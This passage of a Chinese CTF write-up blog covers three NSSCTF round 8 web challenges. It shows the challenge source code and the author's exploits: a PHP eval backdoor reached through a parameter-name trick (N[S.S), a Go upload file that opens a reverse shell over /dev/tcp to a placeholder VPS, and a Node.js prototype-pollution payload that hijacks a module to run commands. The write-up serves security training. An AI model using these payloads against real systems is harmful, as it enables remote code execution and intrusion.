+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;N_S.S&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">eval</span>($_GET[<span style="color:#e6db74">&#39;N_S.S&#39;</span>]);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;file&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location:/index.php?file=&#39;</span>);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    $file <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;file&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/\.\.|la|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#39;</span>, $file)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">include</span> $file;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;error.&#39;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>可以利用eval执行命令</p>
+<pre tabindex="0"><code> eval($_GET[&#39;N_S.S&#39;]);
+</code></pre><p>这个参数<code>N_S.S</code>还涉及到了php的非法传参问题</p>
+<p>当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，也就是说如果中括号<code>[</code>出现在前面，那么中括号<code>[</code>还是会被转换成下划线<code>_</code>，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code></p>
+<p>那么就可以用<code>N[S.S</code> 传参</p>
+<p>flag找了挺久，在环境变量env里面</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302111414931.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302111414931.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302111414931.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302111414931.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302111414931.png"
+        title="image-20230211141435871" /></p>
+<h2 id="upload_gogoggo">Upload_gogoggo</h2>
+<blockquote>
+<p>没有任何过滤的文件上传！</p>
+</blockquote>
+<p>是一个golang的文件上传 类似于<code>[2022DASCTF MAY 挑战赛] hackme</code> 没有复现吃亏了</p>
+<p>之前也没接触很少go的题目</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302131518407.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302131518407.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302131518407.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302131518407.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302131518407.png"
+        title="image-20230213151844728" /></p>
+<p>这里上传了个pass.png 可以看到它<code>System output : go pass: unknown command</code></p>
+<p>执行了 <code>go pass</code>的命令</p>
+<p>可以上传一个golang命令执行的文件 <code>run.go</code> ，这样就会执行<code> go run</code>的命令</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;log&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;os/exec&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cmd</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">exec</span>.<span style="color:#a6e22e">Command</span>(<span style="color:#e6db74">&#34;/bin/bash&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">&#34;bash -i &amp;&gt; /dev/tcp/vps/ip 0&gt;&amp;1&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">out</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">CombinedOutput</span>()
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;combined out:\n%s\n&#34;</span>, string(<span style="color:#a6e22e">out</span>))
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalf</span>(<span style="color:#e6db74">&#34;cmd.Run() failed with %s\n&#34;</span>, <span style="color:#a6e22e">err</span>)
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;combined out:\n%s\n&#34;</span>, string(<span style="color:#a6e22e">out</span>))
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302131536014.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302131536014.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302131536014.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302131536014.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302131536014.png"
+        title="image-20230213153607946" /></p>
+<p>flag是藏在home下</p>
+<h2 id="ez_node">ez_node</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;express&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;path&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;fs&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">multer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;multer&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">PORT</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">port</span> <span style="color:#f92672">||</span> <span style="color:#ae81ff">3000</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">global</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;global&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#a6e22e">PORT</span>, () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`listen at </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">PORT</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">target</span>, <span style="color:#a6e22e">source</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">source</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">source</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">target</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">target</span>[<span style="color:#a6e22e">key</span>], <span style="color:#a6e22e">source</span>[<span style="color:#a6e22e">key</span>])
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">target</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">source</span>[<span style="color:#a6e22e">key</span>]
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">objMulter</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">multer</span>({ <span style="color:#a6e22e">dest</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;./upload&#34;</span> });
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">objMulter</span>.<span style="color:#a6e22e">any</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">express</span>.<span style="color:#66d9ef">static</span>(<span style="color:#e6db74">&#34;./public&#34;</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#34;/upload&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">oldName</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">files</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">path</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">newName</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">files</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">path</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">files</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">originalname</span>).<span style="color:#a6e22e">ext</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">renameSync</span>(<span style="color:#a6e22e">oldName</span>, <span style="color:#a6e22e">newName</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>({
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">err</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;./upload/&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">files</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">filename</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">files</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">originalname</span>).<span style="color:#a6e22e">ext</span>
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">error</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;./err.js&#39;</span>).<span style="color:#a6e22e">getRandomErr</span>())
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/pollution&#39;</span>, <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;body-parser&#39;</span>).<span style="color:#a6e22e">json</span>(), (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> {};
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;Register successfully!tql&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;./err.js&#39;</span>).<span style="color:#a6e22e">getRandomErr</span>()
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">error</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;./err.js&#39;</span>).<span style="color:#a6e22e">getRandomErr</span>())
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>})
+</span></span></code></pre></div><p>这题没看懂</p>
+<p><a href="http://gtg.ink/ez-node-NSSCTF-round-8/" target="_blank" rel="noopener noreffer">http://gtg.ink/ez-node-NSSCTF-round-8/</a>
+ 出题人的wp</p>
+<p><a href="https://blog.csdn.net/weixin_52585514/article/details/128985443" target="_blank" rel="noopener noreffer">https://blog.csdn.net/weixin_52585514/article/details/128985443</a>
+ V2师傅的wp</p>
+<p>此题类似<code>BalsnCTF 2022 2linenodejs</code> ，v2师傅就直接用这个题的exp打</p>
+<!-- raw HTML omitted -->
+<p>预期解是</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">//上传部分
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">obj</span><span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">getRandomErr</span><span style="color:#f92672">:</span>() =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">execSync</span>(<span style="color:#e6db74">&#39;cat /flag&#39;</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//污染部分
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{<span style="color:#e6db74">&#34;constructor&#34;</span><span style="color:#f92672">:</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;prototype&#34;</span><span style="color:#f92672">:</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;data&#34;</span><span style="color:#f92672">:</span>{
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;exports&#34;</span><span style="color:#f92672">:</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;.&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;./16285e8a41e03031c3638c8991393bc8.js&#34;</span>
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;name&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;./err.js&#34;</span>
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;path&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;./upload&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-08-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/ctf/nss%23roun8-web%E4%B8%93%E9%A1%B9%E8%B5%9B/" data-title="NSS#roun8 web专项赛" data-hashtags=""><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/ctf/nss%23roun8-web%E4%B8%93%E9%A1%B9%E8%B5%9B/" data-hashtag=""><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/ctf/nss%23roun8-web%E4%B8%93%E9%A1%B9%E8%B5%9B/" data-title="NSS#roun8 web专项赛"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/ctf/nss%23roun8-web%E4%B8%93%E9%A1%B9%E8%B5%9B/" data-title="NSS#roun8 web专项赛"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/ctf/nss%23roun8-web%E4%B8%93%E9%A1%B9%E8%B5%9B/" data-title="NSS#roun8 web专项赛"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/ctf/python-pth%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell/" class="prev" rel="prev" title="Python pth文件写入getshell"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Python pth文件写入getshell</a>
+            <a href="/posts/ctf/nodejs/" class="next" rel="next" title="nodejs">nodejs<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
